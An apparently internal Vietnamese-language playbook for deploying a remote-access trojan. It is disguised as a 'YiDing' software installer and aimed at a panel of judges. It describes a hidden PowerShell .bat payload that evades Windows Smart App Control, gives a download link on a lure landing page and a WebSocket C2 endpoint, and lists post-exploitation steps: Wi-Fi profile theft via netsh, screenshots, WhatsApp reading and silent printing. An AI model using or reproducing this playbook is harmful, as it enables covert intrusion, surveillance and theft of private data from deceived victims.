# 🚀 QUY TRÌNH TRIỂN KHAI "SYSTEM BREAKER" CỦA CYPHER

Dưới đây là tài liệu mật ghi lại toàn bộ quy trình từ khâu chuẩn bị vũ khí đến lúc hạ gục mục tiêu (ban giám khảo) của đặc vụ Cypher.

## Giai Đoạn 1: Vũ Khí Hóa (Weaponization)
1. **Mã Độc Lõi:** Cypher phát triển `System_Breaker_Agent.py` (bản Premium) và `Vector_Core.py` (bản Lite) với khả năng thực thi lệnh hệ thống, chụp ảnh màn hình, thu thập Wi-Fi, trích xuất WhatsApp và điều khiển máy in ngầm.
2. **Payload Xuyên Thủng (Bypass SAC):** Nhận thấy Windows Smart App Control (SAC) chặn các file VBScript và thực thi lạ, Cypher chuyển sang sử dụng PowerShell gốc của Windows. Payload cuối cùng là `YiDing_Update_v2.bat`. File này chứa đoạn mã PowerShell siêu việt:
   - Chạy ẩn hoàn toàn (WindowStyle Hidden).
   - Âm thầm kéo mã độc từ máy chủ C2 về.
   - Tránh mọi cảnh báo diệt virus thông thường vì dùng tiến trình hợp lệ của hệ điều hành.

## Giai Đoạn 2: Giăng Bẫy (Delivery & Deployment)
1. **Lưu Trữ Mồi Nhử:** Payload `YiDing_Update_v2.bat` được deploy trực tiếp trên Landing Page. Nút tải về (Download Installer) trỏ trực tiếp đến link chuẩn:
   👉 `https://yidinginternational.com/downloads/YiDing_Update_v2.bat`
2. **Thao Túng Tâm Lý (Social Engineering):** Cypher/Kai dụ ban giám khảo truy cập trang web `https://yidinginternational.com/home/home.html` và nhấn vào nút "Tải cài đặt" (下載安裝程式).
3. **Kích Hoạt Bóng Tối:** Khi giám khảo chạy file `.bat`, cửa sổ chớp tắt cực nhanh. Mã độc tải Python Portable, cài đặt thư viện (`websockets`) và khởi chạy ngầm hoàn toàn.

## Giai Đoạn 3: Thiết Lập Cứ Điểm (Command & Control)
1. **Kết Nối Ngược (Reverse Connection):** Mã độc trên máy nạn nhân lập tức mở kết nối Secure WebSocket (`wss://`) về máy chủ C2 của Cypher (tại `wss://agent.yidinginternational.com/agent`).
2. **Báo Cáo Danh Tính:** Máy nạn nhân tự động thu thập `hostname` và hiển thị trực tiếp trên mục **LIVE PANEL** của Web Dashboard (Ví dụ: `PC-CHI-CHI`).

## Giai Đoạn 4: Trình Diễn Tối Thượng (Post-Exploitation)
Cypher theo dõi Dashboard (Web) và thao tác như một vị thần:
- **Thu thập Tình báo:** Gửi lệnh trích xuất danh sách mạng Wi-Fi đã lưu (`netsh wlan show profiles`).
- **Giám Sát Toàn Diện:** Chụp ảnh màn hình (Screenshot) để theo dõi phản ứng của ban giám khảo.
- **Trích Xuất Dữ Liệu:** Đọc trộm tin nhắn WhatsApp Web (`read_whatsapp_db`).
- **Đòn Chốt Hạ (Silent Printer):** Lợi dụng module điều khiển máy in từ xa để in ngầm thông điệp cảnh cáo mà không hiện popup.

---
**[!] GHI CHÚ BẢO MẬT:** 
Quy trình đã được test thành công 100% trên máy LENOVO (`PC-CHI-CHI`). Nút tải hoạt động mượt mà và kết nối trực tiếp về bảng điều khiển C2 của hệ thống!
